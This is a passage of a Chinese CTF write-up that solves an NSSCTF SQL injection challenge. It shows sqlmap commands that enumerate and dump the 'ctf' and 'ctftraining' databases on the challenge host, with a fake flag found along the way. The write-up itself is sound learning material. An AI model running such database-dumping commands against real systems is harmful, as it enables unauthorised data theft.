...
```
![](NSSCTF五题积累（七）/file-20260512140019766.png)
```
sqlmap -u "http://node5.anna.nssctf.cn:25436/?id=1" -D ctf -T users --dump
```
![](NSSCTF五题积累（七）/file-20260512164249175.png)

说是假的flag
再去看：ctftraining
```
sqlmap -u "http://node5.anna.nssctf.cn:25436/?id=1" -D ctftraining --tables
```
![](NSSCTF五题积累（七）/file-20260512165010737.png)
```
sqlmap -u "http://node5.anna.nssctf.cn:25436/?id=1" -D ctftraining -T flag --dump
```

![](NSSCTF五题积累（七）/file-20260512173359800.png)